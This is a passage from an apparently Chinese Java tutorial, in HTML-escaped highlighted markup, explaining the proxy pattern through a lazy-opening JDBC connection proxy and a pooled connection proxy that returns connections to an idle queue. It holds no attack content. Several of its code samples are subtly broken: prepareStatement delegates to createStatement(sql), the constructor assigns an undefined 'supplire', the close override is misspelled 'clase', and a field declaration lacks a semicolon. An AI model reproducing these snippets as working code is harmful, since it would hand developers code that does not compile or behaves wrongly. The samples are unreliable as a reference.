&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">PreparedStatement&lt;/span> &lt;span style="color:#111">ps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">prepareStatement&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;SELECT * FROM students&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 打开了真正的Connection
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ResultSet&lt;/span> &lt;span style="color:#111">rs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">executeQuery&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">rs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">rs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于这个LazyConnectionProxy来说，为了简化代码，我们首先针对Connection接口做一个抽象的代理类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">AbstractConnectionProxy&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 抽象方法获取实际的Connection
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#75af00">getRealConnection&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实现Connection接口的每一个方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Statement&lt;/span> &lt;span style="color:#75af00">createStatement&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SQLException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getRealConnection&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">createStatement&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">PreparedStatement&lt;/span> &lt;span style="color:#75af00">prepareStatement&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">sql&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SQLException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getRealConnection&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">createStatement&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sql&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个&lt;code>AbstractConnectionProxy&lt;/code>代理类的作用是把&lt;code>Connection&lt;/code>接口定义的方法全部实现一遍，因为&lt;code>Connection&lt;/code>接口定义的方法太多了，后面我们要编写的&lt;code>LazyConnectionProxy&lt;/code>只需要继承&lt;code>AbstractConnectionProxy&lt;/code>，就不必再把&lt;code>Connection&lt;/code>接口方法挨个实现一遍&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">LazyConnectionProxy&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">AbstractConnectionProxy&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">Supplier&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">supplier&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">LazyConnectionProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Supplier&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">supplier&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">supplier&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">supplire&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 覆写close方法：只有target不为null时才需要关闭
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">clase&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SQLException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">target&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Close connection: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#75af00">getRealConnection&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">target&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">supplier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果调用者没有执行任何SQL语句，那么&lt;code>target&lt;/code>字段始终为&lt;code>null&lt;/code>。只有第一次执行SQL语句时（即调用任何类似&lt;code>prepareStatement()&lt;/code>方法时，触发&lt;code>getRealConnection()&lt;/code>调用），才会真正打开实际的JDBC Connection&lt;/p>
&lt;p>最后，我们还需要编写一个&lt;code>LazyDataSource&lt;/code>来支持这个&lt;code>LazyConnectionProxy&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">LazyDataSource&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">DataSource&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">LazyDataSource&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SQLException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyConnectionProxy&lt;/span>&lt;span style="color:#f92672">(()&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">DriverManager&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Open connection: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">SQLException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们执行代码，输出如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>get lazy connection...
get lazy connection...
Open connection: com.mysql.jdbc.JDBC4Connection@7a36aefa
小明
小红
小军
小白
...
Close connection: com.mysql.jdbc.JDBC4Connection@7a36aefa
&lt;/code>&lt;/pre>&lt;p>可见第一个&lt;code>getConnection()&lt;/code>调用获取到的&lt;code>LazyConnectionProxy&lt;/code>并没有实际打开真正的JDBC Connection。&lt;/p>
&lt;p>使用连接池的时候，我们更希望能重复使用连接。如果调用方编写这样的代码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DataSource&lt;/span> &lt;span style="color:#111">pooledDataSource&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PooledDataSource&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">jdbcUrl&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">jdbcUsername&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">jdbcPassword&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pooledDataSource&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pooledDataSource&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取到的是同一个Connection
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pooledDataSource&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取到的是同一个Connection
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用方并不关心是否复用了&lt;code>Connection&lt;/code>，但从&lt;code>PooledDataSource&lt;/code>获取的&lt;code>Connection&lt;/code>确实自带这个优化功能。如何实现可复用&lt;code>Connection&lt;/code>的连接池？答案仍然是使用代理模式。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PooledConnectionProxy&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">AbstractConnectionProxy&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实际的Connection:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 空闲队列:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Queue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">PooledConnectionProxy&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">idleQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">PooledConnectionProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Queue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">PooledConnectionProxy&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">idleQueue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">idleQueue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">idleQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SQLException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Fake close and released to idle queue for future reuse: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 并没有调用实际Connection的close()方法,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 而是把自己放入空闲队列:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">idleQueue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">offer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#75af00">getRealConnection&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>复用连接的关键在于覆写&lt;code>close()&lt;/code>方法，它并没有真正关闭底层JDBC连接，而是把自己放回一个空闲队列，以便下次使用。&lt;/p>
